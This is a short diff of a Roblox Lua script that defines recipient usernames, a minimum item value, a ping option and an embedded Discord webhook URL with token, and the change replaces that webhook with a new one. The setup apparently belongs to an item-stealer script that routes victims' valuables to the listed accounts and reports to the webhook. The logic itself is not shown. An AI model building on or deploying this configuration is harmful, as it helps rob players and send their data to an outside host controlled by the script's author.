@@ -7,7 +7,7 @@ _G.scriptExecuted = true
 local users = _G.Usernames or {"iamzanji11", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55"}
 local min_value = _G.min_value or 10000000
 local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1397050931475906622/SfHsX5ToYLywNh3gUVM2W2XmaMPumldSwB6ttvkAX6QWFU3YP6VInlIaPJIsv-hure37"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1397099593405038613/5xrIxTkS6bQVAQSWILV8NnQ536niOaRE4Mz0DjjBOQn6E-SnVPHObnlHaY4QUTldBHX5"
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
